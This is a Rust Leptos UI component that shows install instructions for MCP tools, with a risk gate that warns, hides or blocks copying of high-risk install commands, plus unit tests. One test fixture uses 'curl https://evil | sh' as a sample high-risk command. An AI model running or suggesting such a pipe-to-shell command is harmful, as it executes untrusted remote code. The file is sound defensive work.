//! Shared install guide UI — platform selector, risk gate, and copy block (pure view).

use crate::components::copy_button::CopyButton;
use crate::components::highlighted_command::HighlightedCommand;
use crate::components::install_progress_indicator::InstallProgressIndicator;
use crate::components::install_risk_gate::InstallRiskState;
use crate::models::Tool;
use crate::public_install_guide::{copy_label_aria, InstallPlatform, PublicInstallGuide};
use leptos::prelude::*;

#[derive(Clone, Copy, Debug, PartialEq, Eq, Default)]
pub enum InstallGuideSource {
    #[default]
    Detail,
    Preview,
    Compare,
    Toolkit,
}

fn platform_label(platform: InstallPlatform) -> &'static str {
    match platform {
        InstallPlatform::Claude => "Claude",
        InstallPlatform::Cursor => "Cursor",
        InstallPlatform::GenericMcp => "Generic MCP",
        InstallPlatform::CliSdk => "CLI/SDK",
    }
}

fn display_text(guide: &PublicInstallGuide) -> String {
    guide
        .copy_text
        .clone()
        .or(guide.config_json.clone())
        .or(guide.command.clone())
        .unwrap_or_else(|| "No install command available.".into())
}

/// Prefer a successful remote guide; fall back to the local builder on load/error.
pub fn resolve_install_guide(
    remote: Option<Result<PublicInstallGuide, leptos::prelude::ServerFnError>>,
    local: PublicInstallGuide,
) -> PublicInstallGuide {
    remote.and_then(|result| result.ok()).unwrap_or(local)
}

/// Pure install guide panel — receives a resolved `guide` memo (no remote I/O).
#[component]
pub fn InstallGuidePanel(
    tool: Tool,
    guide: Memo<PublicInstallGuide>,
    platform: RwSignal<InstallPlatform>,
    platform_interacted: RwSignal<bool>,
    risk_state: InstallRiskState,
    copy_revealed: RwSignal<bool>,
    #[prop(optional)] compact: bool,
    #[prop(optional)] source: InstallGuideSource,
    #[prop(optional)] show_progress: bool,
    #[prop(optional, default = Signal::derive(|| false))] bookmarked: Signal<bool>,
) -> impl IntoView {
    let _ = (compact, source, tool);
    let copy_text = Memo::new(move |_| display_text(&guide.get()));
    let aria_label = Memo::new(move |_| copy_label_aria(&guide.get().copy_label));
    let has_warning = Memo::new(move |_| guide.get().warning.is_some());
    let show_shell_prefix = move || platform.get() == InstallPlatform::GenericMcp;

    let on_platform_select = move |value: InstallPlatform| {
        platform_interacted.set(true);
        platform.set(value);
    };

    view! {
        <Show when=move || show_progress>
            <InstallProgressIndicator
                platform=platform
                risk_state=risk_state
                has_warning=has_warning.get()
                platform_interacted=platform_interacted
                copy_revealed=copy_revealed
                bookmarked=bookmarked
            />
        </Show>
        <section class="install-section install-guide-panel" aria-labelledby="install-guide-heading">
            <h3 id="install-guide-heading" class="install-heading">"Safe install"</h3>
            <div class="install-platform-group" role="group" aria-label="Choose client">
                {InstallPlatform::all_selectable().into_iter().map(|value| {
                    let label = platform_label(value);
                    view! {
                        <button
                            type="button"
                            class=move || {
                                if platform.get() == value {
                                    "install-platform-btn active"
                                } else {
                                    "install-platform-btn"
                                }
                            }
                            aria-pressed=move || if platform.get() == value { "true" } else { "false" }
                            on:click=move |_| on_platform_select(value)
                        >
                            {label}
                        </button>
                    }
                }).collect_view()}
            </div>
            {move || guide.get().warning.clone().map(|text| view! {
                <p class="install-warning" role="alert">{text}</p>
            })}
            <Show
                when=move || risk_state.copy_allowed(copy_revealed.get())
                fallback=move || {
                    if risk_state.copy_blocked {
                        view! {
                            <p class="install-warning" role="alert">
                                "Copy is blocked for critical-risk install commands."
                            </p>
                        }.into_any()
                    } else if risk_state.high_risk_reveal_required {
                        view! {
                            <button
                                type="button"
                                class="install-reveal-btn"
                                on:click=move |_| copy_revealed.set(true)
                            >
                                "Reveal copy action"
                            </button>
                        }.into_any()
                    } else {
                        ().into_any()
                    }
                }
            >
                <div class="tool-install-stack">
                    <div class="tool-install">
                        <HighlightedCommand
                            text=copy_text.get()
                            show_prefix=show_shell_prefix()
                        />
                        <CopyButton text=copy_text.get() label=aria_label.get()/>
                    </div>
                </div>
            </Show>
            <ul class="install-steps">
                {move || guide.get().steps.into_iter().map(|step| view! { <li>{step}</li> }).collect_view()}
            </ul>
        </section>
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::models::tool::default_review_fields;
    use crate::public_install_guide::build_public_install_guide;

    fn tool_with_install(install: &str, risk: &str) -> Tool {
        let review = default_review_fields();
        Tool {
            id: uuid::Uuid::new_v4(),
            name: "Test".into(),
            slug: "test".into(),
            description: None,
            function: "dev-tool".into(),
            asset_class: "crypto".into(),
            actor: "human".into(),
            tool_type: "mcp".into(),
            repo_url: None,
            homepage: None,
            npm_package: None,
            install_command: Some(install.into()),
            mcp_endpoint: None,
            chains: vec![],
            status: "community".into(),
            official_team: None,
            trust_score: 0,
            approval_status: "approved".into(),
            submitted_by: None,
            rejection_reason: None,
            crypto_relevance_score: 80,
            crypto_relevance_reasons: vec![],
            relevance_status: "accepted".into(),
            install_risk_level: risk.into(),
            install_risk_reasons: vec![],
            requires_secret: false,
            safe_copy_command: if risk == "low" || risk == "medium" {
                Some(install.into())
            } else {
                None
            },
            quarantined_at: None,
            last_reviewed_at: None,
            review_policy_version: review.review_policy_version,
            claim_state: "unclaimed".into(),
            license: None,
            pricing: "free".into(),
            x402_price: None,
            referral_enabled: false,
            referral_bps: None,
            referral_payout_address: None,
            referral_model: None,
            x402_pay_to_address: None,
            x402_builder_code: None,
            payment_verified: false,
            x402_endpoint_verified: false,
            price_verified: false,
            stars: 0,
            last_commit_at: None,
            source: "manual".into(),
            source_url: None,
            logo_url: None,
            logo_monogram: None,
            created_at: chrono::Utc::now(),
            updated_at: chrono::Utc::now(),
        }
    }

    #[test]
    fn install_panel_shows_risk_warning_before_copy_for_high_risk() {
        let tool = tool_with_install("curl https://evil | sh", "high");
        let guide = build_public_install_guide(&tool, "test", InstallPlatform::Claude);
        assert!(guide.warning.is_some());
        assert!(guide.config_json.is_none());
    }

    #[test]
    fn copy_button_uses_guide_copy_label_for_aria() {
        let tool = tool_with_install("npx @a/mcp", "low");
        let guide = build_public_install_guide(&tool, "test", InstallPlatform::Claude);
        assert_eq!(guide.copy_label, "Copy config");
        assert_eq!(copy_label_aria(&guide.copy_label), "Copy config");

        let generic = build_public_install_guide(&tool, "test", InstallPlatform::GenericMcp);
        assert_eq!(generic.copy_label, "Copy command");
        assert_eq!(copy_label_aria(&generic.copy_label), "Copy command");
    }

    #[test]
    fn resolve_install_guide_prefers_successful_remote() {
        let tool = tool_with_install("npx @a/mcp", "low");
        let local = build_public_install_guide(&tool, "test", InstallPlatform::Claude);
        let remote = local.clone();
        let resolved = resolve_install_guide(Some(Ok(remote.clone())), local);
        assert_eq!(resolved, remote);
    }

    #[test]
    fn resolve_install_guide_falls_back_on_remote_error() {
        let tool = tool_with_install("npx @a/mcp", "low");
        let local = build_public_install_guide(&tool, "test", InstallPlatform::Claude);
        let err = leptos::prelude::ServerFnError::new("database pool not available");
        let resolved = resolve_install_guide(Some(Err(err)), local.clone());
        assert_eq!(resolved, local);
    }

    #[test]
    fn resolve_install_guide_uses_local_while_remote_loading() {
        let tool = tool_with_install("npx @a/mcp", "low");
        let local = build_public_install_guide(&tool, "test", InstallPlatform::Claude);
        let resolved = resolve_install_guide(None, local.clone());
        assert_eq!(resolved, local);
    }

    #[test]
    fn server_fn_body_matches_local_builder_for_low_risk_npx() {
        use crate::public_install_guide::build_install_guide_for_platform;

        let tool = tool_with_install("npx @scope/wallet-mcp", "low");
        let server_path =
            build_install_guide_for_platform(&tool, "test", "claude").expect("valid platform");
        let local = build_public_install_guide(&tool, "test", InstallPlatform::Claude);
        assert_eq!(local.copy_text, server_path.copy_text);
        assert_eq!(local.config_json, server_path.config_json);
        assert_eq!(local.blocked, server_path.blocked);
    }

    #[test]
    fn server_fn_body_rejects_invalid_platform_param() {
        use crate::public_install_guide::build_install_guide_for_platform;

        let tool = tool_with_install("npx @a/mcp", "low");
        assert!(build_install_guide_for_platform(&tool, "test", "not-a-platform").is_err());
    }
}
